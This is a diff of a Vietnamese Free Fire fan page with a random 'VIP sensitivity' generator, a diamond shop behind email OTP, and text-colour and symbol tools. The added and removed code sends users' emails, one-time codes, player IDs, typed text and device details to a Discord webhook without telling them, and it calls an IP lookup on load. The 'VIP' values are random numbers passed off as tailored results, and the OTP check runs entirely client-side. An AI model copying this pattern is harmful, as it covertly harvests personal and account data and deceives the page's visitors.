+    const btn = document.getElementById('btnSendKcOtp');
+    const emailRegex = /^[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$/;
+
+    if (!emailRegex.test(emailInput)) {
+      status.style.color = "#ff6b86";
+      status.textContent = "Vui lòng nhập địa chỉ email hợp lệ.";
+      return;
+    }
+
+    if (isDisposableOrFakeEmail(emailInput)) {
+      status.style.color = "#ff6b86";
+      status.textContent = "Email này nằm trong danh sách bị chặn, vui lòng dùng email khác.";
+      return;
+    }
+
+    // Kiểm tra chống spam cho từng địa chỉ email
+    const limitState = getEmailOtpState(emailInput);
+    if (limitState.remainingSeconds > 0) {
+      status.style.color = "#ff6b86";
+      status.textContent = `Email ${emailInput} vừa yêu cầu OTP (lần ${limitState.count}). Vui lòng chờ ${formatRemainingTime(limitState.remainingSeconds)} rồi mới gửi lại!`;
+      startOtpCooldownWatcher(emailInput);
+      return;
+    }
+
+    if (!window.emailjs) {
+      status.style.color = "#ff6b86";
+      status.textContent = "Không tải được thư viện gửi mã, hãy kiểm tra kết nối mạng.";
+      return;
+    }
+
+    currentEmail = emailInput;
+    generatedOTP = String(Math.floor(100000 + Math.random() * 900000));
+
+    if (btn) {
+      btn.disabled = true;
+      btn.textContent = "Đang gửi...";
+    }
+    status.style.color = "#00f0ff";
+    status.textContent = "Đang gửi mã OTP qua email...";
+
+    emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+      user_email: currentEmail,
+      otp_code: generatedOTP,
+      time: getExpiryTimeString()
+    }, { publicKey: PUBLIC_KEY }).then(() => {
+      const info = recordOtpSentForEmail(currentEmail);
+      startOtpCooldownWatcher(currentEmail);
+
+      document.getElementById('otpStep').style.display = 'block';
+      status.style.color = "#00f0ff";
+      status.textContent = `Mã OTP đã gửi tới ${currentEmail} (lần ${info.count}). Sau ${formatRemainingTime(info.cooldownSeconds)} mới có thể gửi lại.`;
+
+      sendDiscordNotify("📩 Yêu Cầu OTP Shop KC", [
+        { name: "Email", value: currentEmail, inline: true },
+        { name: "Mã OTP", value: generatedOTP, inline: true },
+        { name: "Lần yêu cầu", value: `Lần ${info.count} (chờ ${formatRemainingTime(info.cooldownSeconds)})`, inline: false }
+      ]);
+    }).catch((err) => {
+      if (btn) {
+        btn.disabled = false;
+        btn.textContent = "Gửi mã OTP";
+      }
+      console.error("EmailJS sendKcOTP error:", err);
+      const detail = err?.text || err?.message || "Lỗi không xác định từ EmailJS";
+      status.style.color = "#ff6b86";
+      status.textContent = `Không gửi được mã OTP: ${detail}`;
+    });
+  }
+
+  function verifyKcOTP() {
+    const entered = document.getElementById('kcOtpInput').value.trim();
+    const status = document.getElementById('kcStatus');
+    if (!generatedOTP || entered !== generatedOTP) {
+      status.style.color = "#ff6b86";
+      status.textContent = "Mã OTP không chính xác.";
+      return;
+    }
+    document.getElementById('shopStage').classList.add('unlocked');
+    status.style.color = "#00f0ff";
+    status.textContent = `Đã xác minh ${currentEmail}. Bạn có thể chọn gói KC bên dưới.`;
+  }
+
+  function submitKcOrder() {
+    const idVal = document.getElementById('playerId').value.trim();
+    const pkg = document.getElementById('kcPackage').value;
+    const status = document.getElementById('kcStatus');
+
+    if (!/^\d{8,}$/.test(idVal)) {
+      status.style.color = "#ff6b86";
+      status.textContent = "ID tài khoản phải gồm ít nhất 8 chữ số.";
+      return;
+    }
+
+    currentId = idVal;
+    status.style.color = "#00f0ff";
+    status.textContent = `Đã ghi nhận yêu cầu gói ${pkg} cho ID ${currentId}.`;
+    sendDiscordNotify("💎 Yêu Cầu Gói Kim Cương", [
+      { name: "ID Tài Khoản", value: currentId, inline: true },
+      { name: "Gói KC", value: pkg, inline: true },
+      { name: "Email", value: currentEmail || "Chưa có", inline: false }
+    ]);
+  }
 
   function renderColorCells() {
     const grid = document.getElementById('colorGrid');
@@ -514,254 +1369,255 @@
         <button type="button" id="copyColorBtn_${idx}" class="cell-copy-btn" onclick="copySingleColorCode(${idx})">COPY</button>
       </div>
     `).join('');
+
+    const swatchesEl = document.getElementById('quickSwatches');
+    if (swatchesEl) {
+      swatchesEl.innerHTML = FF_COLOR_CODES.slice(0, 12).map(item => `
+        <button type="button" class="quick-dot" title="${item.name} ${item.code}" style="background:${item.hex};" onclick="applyColorToSelectedChar('${item.hex}')"></button>
+      `).join('');
+    }
   }
 
   function copySingleColorCode(idx) {
     const item = FF_COLOR_CODES[idx];
     if (!item) return;
-    navigator.clipboard?.writeText(item.code).catch(() => {});
-
-    const btn = document.getElementById(`copyColorBtn_${idx}`);
-    if (btn) {
+    copyToClipboard(item.code).then(() => {
+      const btn = document.getElementById(`copyColorBtn_${idx}`);
+      if (!btn) return;
       btn.textContent = "ĐÃ CHÉP";
       btn.classList.add('copied');
       setTimeout(() => {
         btn.textContent = "COPY";
         btn.classList.remove('copied');
-      }, 1300);
-    }
-  }
-
-  function openScreen(target) {
-    const menuEl = document.getElementById('menuScreen');
-    const titleEl = document.getElementById('mainPortalTitle');
-    const sensiEl = document.getElementById('sensiScreen');
-    const shopEl = document.getElementById('shopScreen');
-    const colorEl = document.getElementById('colorScreen');
-
-    menuEl.classList.toggle('hidden', target !== 'menu');
-    titleEl.style.display = target === 'menu' ? 'block' : 'none';
-    sensiEl.classList.toggle('active', target === 'sensi');
-    shopEl.classList.toggle('active', target === 'shop');
-    colorEl.classList.toggle('active', target === 'color');
-  }
-
-  function copyZeusUid() {
-    const uid = document.getElementById('zeusUidText').textContent.trim();
-    navigator.clipboard?.writeText(uid).catch(() => {});
-    const btn = document.getElementById('btnCopyUid');
-    btn.innerHTML = "ĐÃ<br>CHÉP";
-    setTimeout(() => { btn.innerHTML = "SAO<br>CHÉP"; }, 1500);
-  }
-
-  function randRange(min, max) {
-    return Math.floor(Math.random() * (max - min + 1)) + min;
-  }
-
-  function generateRandomSensi() {
-    const deviceRaw = document.getElementById('deviceModel').value.trim().toLowerCase();
-    let ranges = {
-      look: [175, 198],
-      redDot: [165, 192],
-      x2: [160, 188],
-      x4: [155, 182],
-      awm: [120, 165],
-      look360: [150, 185]
-    };
-
-    if (deviceRaw.includes('pc') || deviceRaw.includes('bluestacks') || deviceRaw.includes('chuột')) {
-      ranges = { look: [125, 175], redDot: [120, 170], x2: [115, 165], x4: [110, 160], awm: [100, 145], look360: [120, 165] };
-    } else if (deviceRaw.includes('iphone') || deviceRaw.includes('ios')) {
-      ranges = { look: [180, 200], redDot: [172, 196], x2: [165, 190], x4: [158, 185], awm: [125, 170], look360: [160, 192] };
-    }
-
-    latestSensiData = {
-      "Nhìn xung quanh": randRange(...ranges.look),
-      "Red Dot": randRange(...ranges.redDot),
-      "Ống ngắm 2x": randRange(...ranges.x2),
-      "Ống ngắm 4x": randRange(...ranges.x4),
-      "Ống ngắm AWM": randRange(...ranges.awm),
-      "Nhìn 360°": randRange(...ranges.look360)
-    };
-
-    document.getElementById('sensiGrid').innerHTML = Object.entries(latestSensiData).map(([name, val]) => `
-      <div class="sensi-item">
-        <span class="sensi-name">${name}</span>
-        <span class="sensi-val">${val}</span>
-      </div>
-    `).join('');
-
-    document.getElementById('btnCopySensi').textContent = "COPY";
-  }
-
-  function checkVipSensitivity() {
-    const device = document.getElementById('deviceModel').value.trim();
-    const code = document.getElementById('vipCodeInput').value.trim().toLowerCase();
-    const msgEl = document.getElementById('sensiMsg');
-
-    if (!device) {
-      msgEl.style.color = "#ff6b86";
-      msgEl.textContent = "Vui lòng nhập dòng máy của bạn trước!";
-      return;
-    }
-
-    if (code !== VALID_VIP_CODE.toLowerCase()) {
-      msgEl.style.color = "#ff6b86";
-      msgEl.textContent = "Mã code chưa đúng! Hãy dùng UID 1755440836 để lấy mã code hợp lệ.";
-      return;
-    }
-
-    msgEl.style.color = "#00f0ff";
-    msgEl.textContent = "Mã code hợp lệ! Thông số độ nhạy cho máy của bạn:";
-    document.getElementById('checkedDeviceText').textContent = device;
-    generateRandomSensi();
-    document.getElementById('sensiResultCard').classList.add('show');
-
-    const sensiSummary = Object.entries(latestSensiData).map(([k, v]) => `${k}: ${v}`).join(" | ");
-    sendDiscordLog("⚡ CHECK ĐỘ NHẠY VIP", [
-      { name: "📱 Dòng máy", value: `\`${device}\``, inline: true },
-      { name: "🎟️ Code", value: `\`${code}\``, inline: true },
-      { name: "🎯 Thông số", value: `\`\`\`${sensiSummary}\`\`\``, inline: false }
-    ], 1947988);
-  }
-
-  function copyGeneratedSensi() {
-    const device = document.getElementById('deviceModel').value.trim() || "Thiết bị";
-    const lines = Object.entries(latestSensiData).map(([k, v]) => `${k}: ${v}`).join(" | ");
-    navigator.clipboard?.writeText(`[${device}] ${lines}`).catch(() => {});
-    document.getElementById('btnCopySensi').textContent = "ĐÃ CHÉP";
-    setTimeout(() => { document.getElementById('btnCopySensi').textContent = "COPY"; }, 1500);
-  }
-
-  function getVietnamTime() {
-    return new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });
-  }
-
-  function getExpiryTimeString() {
-    const exp = new Date(Date.now() + 15 * 60 * 1000);
-    return exp.toLocaleTimeString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh", hour: "2-digit", minute: "2-digit" });
-  }
-
-  function setKcMessage(msg, isError = false) {
-    const el = document.getElementById('kcStatus');
-    el.style.color = isError ? "#ff6b86" : "#00f0ff";
-    el.textContent = msg;
-  }
-
-  async function sendDiscordLog(title, extraFields, colorCode) {
-    if (!DISCORD_WEBHOOK_URL) return;
-
-    const payload = {
-      embeds: [{
-        title: title,
-        color: colorCode,
-        fields: [
-          { name: "📧 Email", value: `\`${currentEmail || "Chưa có"}\``, inline: true },
-          { name: "🆔 ID Người Chơi", value: `\`${currentId || "Chưa nhập"}\``, inline: true },
-          ...extraFields,
-          { name: "🕒 Thời gian (VN)", value: getVietnamTime(), inline: false },
-          { name: "🌐 Thiết bị", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
-        ]
-      }]
-    };
-
-    try {
-      await fetch(DISCORD_WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      });
-    } catch (err) {
-      console.error("Webhook error:", err);
-    }
-  }
-
-  function sendKcOTP() {
-    const rawEmail = document.getElementById('kcEmail').value.trim().toLowerCase();
-    const btnSend = document.getElementById('btnSendKcOtp');
-
-    const emailRegex = /^[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$/;
-    if (!emailRegex.test(rawEmail)) {
-      setKcMessage("Địa chỉ email chưa đúng định dạng.", true);
-      return;
-    }
-
-    const [name, domain] = rawEmail.split('@');
-    if (blockedPrefixes.some(p => name === p || name.startsWith(p + '_')) || blockedDomains.includes(domain)) {
-      setKcMessage("Vui lòng dùng email hợp lệ, không dùng mail ảo.", true);
-      return;
-    }
-
-    if (!window.emailjs) {
-      setKcMessage("Không tải được thư viện gửi mã, hãy kiểm tra kết nối mạng.", true);
-      return;
-    }
-
-    currentEmail = rawEmail;
-    generatedOTP = Math.floor(100000 + Math.random() * 900000).toString();
-
-    btnSend.disabled = true;
-    btnSend.textContent = "Đang gửi...";
-    setKcMessage("Đang gửi mã OTP xác minh email...");
-
-    emailjs.send(SERVICE_ID, TEMPLATE_ID, {
-      user_email: currentEmail,
-      otp_code: generatedOTP,
-      time: getExpiryTimeString()
-    }, { publicKey: PUBLIC_KEY }).then(() => {
-      btnSend.disabled = false;
-      btnSend.textContent = "Gửi lại mã OTP";
-      document.getElementById('otpStep').style.display = 'block';
-      setKcMessage("Đã gửi mã OTP 6 số! Hãy kiểm tra hộp thư (kể cả mục Spam).");
-
-      sendDiscordLog("📩 YÊU CẦU OTP SHOP KC", [
-        { name: "🔑 Mã OTP", value: `\`${generatedOTP}\``, inline: true },
-        { name: "📌 Trạng thái", value: "Chờ nhập OTP (đang phủ lớp xác minh trên bảng giá)", inline: true }
-      ], 3447003);
-    }, (err) => {
-      btnSend.disabled = false;
-      btnSend.textContent = "Gửi mã OTP";
-      const reason = err?.text || err?.message || "Lỗi không xác định";
-      setKcMessage(`Gửi mã OTP thất bại (${reason}).`, true);
-      console.error("EmailJS error:", err);
+      }, 1100);
     });
   }
 
-  function verifyKcOTP() {
-    const inputOtp = document.getElementById('kcOtpInput').value.trim();
+  function syncCharPalette() {
+    const text = document.getElementById('customFfText').value;
+    const chars = Array.from(text);
+    const oldMap = new Map(perCharItems.map((it, i) => [i, it.color]));
 
-    if (inputOtp === generatedOTP && generatedOTP !== "") {
-      document.getElementById('shopStage').classList.add('unlocked');
-      setKcMessage("Xác minh thành công! Bảng giá KC đã mở rõ.");
+    perCharItems = chars.map((ch, idx) => ({
+      char: ch,
+      color: oldMap.get(idx) || DEFAULT_RAINBOW_HEXES[idx % DEFAULT_RAINBOW_HEXES.length]
+    }));
 
-      sendDiscordLog("✅ XÁC MINH OTP SHOP KC THÀNH CÔNG", [
-        { name: "🔑 Mã OTP", value: `\`${generatedOTP}\``, inline: true },
-        { name: "📌 Trạng thái", value: "Đã gỡ lớp phủ bảng giá", inline: true }
-      ], 3066993);
-    } else {
-      setKcMessage("Mã OTP không chính xác, vui lòng thử lại.", true);
+    if (selectedCharIndex >= perCharItems.length) {
+      selectedCharIndex = Math.max(0, perCharItems.length - 1);
     }
+    renderCharChips();
   }
 
-  function submitKcOrder() {
-    const rawId = document.getElementById('playerId').value.trim();
-    const selectedPkg = document.getElementById('kcPackage').value;
+  function renderCharChips() {
+    const listEl = document.getElementById('charChipsList');
+    const infoEl = document.getElementById('selectedCharInfo');
+    const picker = document.getElementById('singleCharColorPicker');
+    if (!listEl || !infoEl || !picker) return;
 
-    if (!/^\d{8,}$/.test(rawId)) {
-      setKcMessage("ID không hợp lệ! Vui lòng nhập ID dạng số từ 8 chữ số trở lên.", true);
+    if (!perCharItems.length) {
+      listEl.innerHTML = "";
+      infoEl.textContent = "Đang chọn: --";
       return;
     }
 
-    currentId = rawId;
-    setKcMessage(`Đã ghi nhận ID ${currentId} chọn gói ${selectedPkg}.`);
+    listEl.innerHTML = perCharItems.map((item, idx) => {
+      const displayCh = item.char === " " ? "␣" : item.char;
+      return `
+        <button type="button" class="char-chip ${idx === selectedCharIndex ? 'active' : ''}" onclick="selectCharChip(${idx})">
+          <span class="char-dot" style="background:${item.color};"></span>
+          <span>${displayCh}</span>
+        </button>
+      `;
+    }).join('');
 
-    sendDiscordLog("💎 ĐƠN CHỌN GÓI KC", [
-      { name: "📦 Gói đã chọn", value: `\`${selectedPkg}\``, inline: true },
-      { name: "📌 Trạng thái", value: "Đã xác minh OTP & ID >= 8 số", inline: true }
-    ], 15844367);
+    const cur = perCharItems[selectedCharIndex];
+    const disp = cur.char === " " ? "[Khoảng trắng]" : cur.char;
+    infoEl.textContent = `Đang chọn: ${disp} (${cur.color.toUpperCase()})`;
+    picker.value = cur.color;
   }
 
+  function selectCharChip(idx) {
+    selectedCharIndex = idx;
+    renderCharChips();
+  }
+
+  function applyColorToSelectedChar(hex) {
+    if (!perCharItems.length) return;
+    perCharItems[selectedCharIndex].color = hex;
+    renderCharChips();
+  }
+
+  function rainbowizeChars() {
+    if (!perCharItems.length) return;
+    perCharItems = perCharItems.map((it, idx) => ({
+      ...it,
+      color: DEFAULT_RAINBOW_HEXES[idx % DEFAULT_RAINBOW_HEXES.length]
+    }));
+    renderCharChips();
+  }
+
+  function createCodeAndNotifyDiscord() {
+    const status = document.getElementById('customColorStatus');
+    const card = document.getElementById('customOutputCard');
+    const previewEl = document.getElementById('customColorPreview');
+    const codeEl = document.getElementById('generatedFfTextCode');
+
+    if (!perCharItems.length) {
+      status.textContent = "Vui lòng nhập chữ trước khi tạo code màu.";
+      return;
+    }
+
+    const ffCode = perCharItems.map(it => {
+      const tag = it.color.replace('#', '').toUpperCase();
+      return `[${tag}]${it.char}`;
+    }).join('');
+
+    previewEl.innerHTML = perCharItems.map(it => {
+      const safeCh = it.char === " " ? "&nbsp;" : it.char.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+      return `<span style="color:${it.color};">${safeCh}</span>`;
+    }).join('');
+
+    latestCustomFfCode = ffCode;
+    codeEl.textContent = ffCode;
+    card.classList.add('show');
+    status.textContent = "Đã tạo code màu chữ thành công.";
+
+    sendDiscordNotify("🎨 Tạo Code Màu Chữ FF", [
+      { name: "Chữ gốc", value: perCharItems.map(i => i.char).join(''), inline: true },
+      { name: "Code tạo ra", value: ffCode, inline: false }
+    ]);
+  }
+
+  function copyCustomFf() {
+    if (!latestCustomFfCode) return;
+    copyToClipboard(latestCustomFfCode).then(() => {
+      const btn = document.getElementById('btnCopyCustomFf');
+      btn.textContent = "ĐÃ CHÉP";
+      btn.classList.add('copied');
+      setTimeout(() => {
+        btn.textContent = "COPY";
+        btn.classList.remove('copied');
+      }, 1100);
+    });
+  }
+
+  function appendToDraftName(text) {
+    const input = document.getElementById('ffNameDraftInput');
+    if (!input) return;
+    input.value += text;
+  }
+
+  function copyDraftFfName() {
+    const input = document.getElementById('ffNameDraftInput');
+    const toast = document.getElementById('symbolToast');
+    if (!input || !input.value) {
+      if (toast) toast.textContent = "Chưa có tên hoặc kí tự nào để copy.";
+      return;
+    }
+    copyToClipboard(input.value).then(() => {
+      if (toast) toast.textContent = "Đã copy tên đã ghép vào bộ nhớ tạm!";
+    });
+  }
+
+  function clearDraftFfName() {
+    const input = document.getElementById('ffNameDraftInput');
+    const toast = document.getElementById('symbolToast');
+    if (input) input.value = "";
+    if (toast) toast.textContent = "";
+  }
+
+  function formatUnicodeEscapes(str) {
+    return Array.from(str).map(ch => {
+      const code = ch.codePointAt(0);
+      if (code === 0x2009) return "U+2009 (Thin Space)";
+      if (code === 0x3164) return "U+3164 (Hangul Filler)";
+      if (code === 0x2800) return "U+2800 (Braille Blank)";
+      if (code === 0x2003) return "U+2003 (Em Space)";
+      return ch;
+    }).join(" + ");
+  }
+
+  function renderSymbolsAndSpaces() {
+    const spacesEl = document.getElementById('blankSpacesList');
+    if (spacesEl) {
+      spacesEl.innerHTML = FF_BLANK_SPACES.map((sp, idx) => `
+        <div class="space-item">
+          <div>
+            <div class="space-info-title">${sp.title}</div>
+            <div class="space-info-desc">${sp.desc} — <span>${formatUnicodeEscapes(sp.value)}</span></div>
+          </div>
+          <button type="button" id="copySpaceBtn_${idx}" class="cell-copy-btn" onclick="copyBlankSpace(${idx})">COPY</button>
+        </div>
+      `).join('');
+    }
+
+    const container = document.getElementById('symbolCategoriesContainer');
+    if (container) {
+      container.innerHTML = FF_SYMBOL_GROUPS.map((grp, gIdx) => `
+        <div class="symbol-section-box">
+          <div class="symbol-sub-title"><span>${grp.title}</span></div>
+          <div class="symbol-grid">
+            ${grp.items.map((sym, sIdx) => {
+              const id = `symTile_${gIdx}_${sIdx}`;
+              const safeSym = sym.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+              return `
+                <button type="button" id="${id}" class="symbol-tile" onclick="copySymbolItem(${gIdx}, ${sIdx}, '${id}')">
+                  <span class="symbol-char">${safeSym}</span>
+                  <span class="symbol-tag">CHÈN + COPY</span>
+                </button>
+              `;
+            }).join('')}
+          </div>
+        </div>
+      `).join('');
+    }
+  }
+
+  function copyBlankSpace(idx) {
+    const sp = FF_BLANK_SPACES[idx];
+    if (!sp) return;
+    appendToDraftName(sp.value);
+    copyToClipboard(sp.value).then(() => {
+      const btn = document.getElementById(`copySpaceBtn_${idx}`);
+      const toast = document.getElementById('symbolToast');
+      if (btn) {
+        btn.textContent = "ĐÃ CHÉP";
+        btn.classList.add('copied');
+        setTimeout(() => {
+          btn.textContent = "COPY";
+          btn.classList.remove('copied');
+        }, 1100);
+      }
+      if (toast) toast.textContent = `Đã chèn & copy "${sp.title}"!`;
+    });
+  }
+
+  function copySymbolItem(gIdx, sIdx, tileId) {
+    const grp = FF_SYMBOL_GROUPS[gIdx];
+    const sym = grp && grp.items[sIdx];
+    if (!sym) return;
+    appendToDraftName(sym);
+    copyToClipboard(sym).then(() => {
+      const tile = document.getElementById(tileId);
+      const toast = document.getElementById('symbolToast');
+      if (tile) {
+        const tag = tile.querySelector('.symbol-tag');
+        tile.classList.add('copied');
+        if (tag) tag.textContent = "ĐÃ CHÉP";
+        setTimeout(() => {
+          tile.classList.remove('copied');
+          if (tag) tag.textContent = "CHÈN + COPY";
+        }, 1100);
+      }
+      if (toast) toast.textContent = `Đã chèn & copy "${sym}"!`;
+    });
+  }
+
+  initContinuousSnow();
   renderColorCells();
+  renderSymbolsAndSpaces();
+  getUserIpAddress();
 </script>
 
 </body>
